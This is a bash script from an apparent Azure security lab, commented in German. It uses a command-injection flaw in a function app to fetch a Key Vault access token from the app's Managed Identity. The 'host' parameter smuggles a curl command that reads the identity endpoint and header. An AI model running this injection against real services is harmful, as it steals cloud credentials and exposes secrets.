#!/usr/bin/env bash
# ==============================================================================
# 14. KEY VAULT LAB: MANAGED IDENTITY TOKEN ÜBER INJECTION STEHLEN
# ==============================================================================
# Nutzt die Command-Injection-Schwachstelle, um ein Key-Vault-Access-Token
# der zugewiesenen Managed Identity abzurufen.
#
# Wichtig (Architektur-Unterschied zu VMs):
# Azure Functions / App Service stellt Managed-Identity-Tokens nicht über den
# VM-typischen IMDS-Endpunkt (169.254.169.254) bereit, sondern über die lokalen
# Umgebungsvariablen IDENTITY_ENDPOINT und IDENTITY_HEADER auf localhost.
#
# Erklärung der Parameter:
# -G              : Sendet Daten als HTTP-GET-Query-Parameter
# --data-urlencode: Kodiert die injizierte Payload URL-konform
# api-version=2019-08-01 : API-Version des App Service Identity Endpoints
#
# Hinweis: Das zurückgegebene JSON enthält das Feld "access_token", das im
# nächsten Schritt in die Variable TOKEN exportiert wird.

curl -G "https://${FUNCAPP_KV}.azurewebsites.net/api/lookup" \
  --data-urlencode 'host=127.0.0.1;curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01"'
